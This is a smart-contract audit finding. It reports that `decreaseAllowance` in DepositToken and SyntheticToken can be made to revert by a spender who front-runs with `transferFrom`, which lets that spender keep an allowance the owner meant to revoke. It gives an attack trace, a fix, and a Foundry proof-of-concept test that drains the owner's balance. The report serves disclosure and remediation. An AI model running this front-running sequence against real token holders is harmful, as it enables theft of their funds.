### Title
Front-running `decreaseAllowance` causes `DecreasedAllowanceBelowZero` revert and lets a spender keep the allowance the owner tried to revoke - (File: contracts/DepositToken.sol)

### Summary
`DepositToken.decreaseAllowance` (and identically `SyntheticToken.decreaseAllowance`) computes the new allowance as a relative subtraction from current state and reverts when `currentAllowance < subtractedValue_`. A spender who observes the owner's pending `decreaseAllowance` transaction can front-run it with `transferFrom` to consume just enough allowance so the owner's transaction underflows and reverts. The spender then keeps the remaining allowance — exactly the bug class of the Olympus `decreaseDebtorApproval` / `incurDebt` report.

### Finding Description
`DepositToken.sol` lines 195–203:
```solidity
function decreaseAllowance(address spender_, uint256 subtractedValue_) external returns (bool) {
    address _msgSender = _msgSender();
    uint256 _currentAllowance = allowance[_msgSender][spender_];
    if (_currentAllowance < subtractedValue_) revert DecreasedAllowanceBelowZero();
    unchecked {
        _approve(_msgSender, spender_, _currentAllowance - subtractedValue_);
    }
    return true;
}
``` [1](#0-0) 

`transferFrom` reduces `allowance[sender_][spender]` by the pulled amount before moving the tokens: [2](#0-1) 

Attack trace (mirrors the report, with the spender in the role of the debtor):
1. Alice approves Bob for 1000 msdTOKEN (`allowance[Alice][Bob] = 1000`).
2. Alice broadcasts `decreaseAllowance(Bob, 600)` intending to leave 400.
3. Bob (unprivileged EOA/contract) front-runs with `transferFrom(Alice, Bob, 401)`. Allowance is now 599 and Bob already holds 401 of Alice's tokens. The `_revertIfLocked` check in `transferFrom` only requires Alice's balance to be unlocked, which holds when she has no debt position.
4. Alice's `decreaseAllowance(Bob, 600)` executes, sees `599 < 600`, reverts with `DecreasedAllowanceBelowZero`.
5. Bob keeps the 599 allowance he was meant to lose and can pull it at any later time.

All admin-facing limit management elsewhere uses absolute setters (`Pool.updateMaxLiquidable`, `DebtToken.updateMaxTotalSupply`, `SyntheticToken.updateMaxTotalSupply`, `DepositToken.updateMaxTotalSupply`), so this is the only production surface matching the relative-decrement-underflow pattern. [3](#0-2) 

### Impact Explanation
The spender retains an approval the owner intended to revoke and can continue draining the owner's `msdTOKEN` balance (collateral claims) up to the remaining allowance — direct theft of user funds bounded by the original approval. The owner's only recourse is resubmitting `decreaseAllowance` with `type(uint256).max` or `approve(spender, 0)`, which the spender can race again. The same replay applies to `SyntheticToken.sol`'s allowance over freely transferable synth.

### Likelihood Explanation
Requires only that a user uses `decreaseAllowance` (rather than `approve(spender, 0)`) against a spender willing to front-run — the standard mempool/expected-condition race. Likelihood is therefore tied to how often owners perform partial revocation on a malicious or compromised spender; it is conditional on owner behavior, which limits frequency but not exploitability.

### Recommendation
Follow the report's clamp suggestion and the protocol's own pattern of safe bounds: set the new allowance to `0` when `currentAllowance <= subtractedValue_` instead of reverting, so a consumed allowance cannot brick the revocation:
```solidity
uint256 _currentAllowance = allowance[_msgSender][spender_];
uint256 _newAllowance = _currentAllowance <= subtractedValue_ ? 0 : _currentAllowance - subtractedValue_;
_approve(_msgSender, spender_, _newAllowance);
```
Apply identically to `SyntheticToken.decreaseAllowance`.

### Proof of Concept
Foundry fork-style test against the deployed `DepositToken` proxy (e.g. `msdWETH` on Optimism):

```solidity
function test_decreaseAllowance_frontRun() public {
    // Setup: alice holds deposit tokens with no debt (balance fully unlocked)
    vm.startPrank(alice);
    underlying.approve(address(depositToken), type(uint256).max);
    depositToken.deposit(1_000e18, alice);
    depositToken.approve(bob, 1_000e18);
    vm.stopPrank();

    // Bob sees alice's pending decreaseAllowance(bob, 600e18) and front-runs it
    vm.prank(bob);
    depositToken.transferFrom(alice, bob, 401e18); // allowance now 599e18

    // Alice's transaction reverts on underflow-check
    vm.prank(alice);
    vm.expectRevert(DecreasedAllowanceBelowZero.selector);
    depositToken.decreaseAllowance(bob, 600e18);

    // Bob retains 599e18 allowance Alice intended to revoke and drains it
    assertEq(depositToken.allowance(alice, bob), 599e18);
    vm.prank(bob);
    depositToken.transferFrom(alice, bob, 599e18);
    assertEq(depositToken.balanceOf(alice), 0);
}
```

Caveats: the PoC assumes Alice's position is fully unlocked (no outstanding debt), since `transferFrom` enforces `_revertIfLocked`; on a fork this is satisfied by depositing without issuing debt. The identical sequence applies to `SyntheticToken.sol` lines 194–202 and 240–253, where no lock check exists at all.

### Citations

**File:** contracts/DepositToken.sol (L195-203)
```text
    function decreaseAllowance(address spender_, uint256 subtractedValue_) external returns (bool) {
        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[_msgSender][spender_];
        if (_currentAllowance < subtractedValue_) revert DecreasedAllowanceBelowZero();
        unchecked {
            _approve(_msgSender, spender_, _currentAllowance - subtractedValue_);
        }
        return true;
    }
```

**File:** contracts/DepositToken.sol (L357-376)
```text
    function transferFrom(
        address sender_,
        address recipient_,
        uint256 amount_
    ) external override nonReentrant returns (bool) {
        _revertIfLocked(sender_, amount_);

        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[sender_][_msgSender];
        if (_currentAllowance != type(uint256).max) {
            if (_currentAllowance < amount_) revert AmountExceedsAllowance();
            unchecked {
                _approve(sender_, _msgSender, _currentAllowance - amount_);
            }
        }

        _transfer(sender_, recipient_, amount_);

        return true;
    }
```

**File:** contracts/SyntheticToken.sol (L194-202)
```text
    function decreaseAllowance(address spender_, uint256 subtractedValue_) external returns (bool) {
        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[_msgSender][spender_];
        if (_currentAllowance < subtractedValue_) revert DecreasedAllowanceBelowZero();
        unchecked {
            _approve(_msgSender, spender_, _currentAllowance - subtractedValue_);
        }
        return true;
    }
```
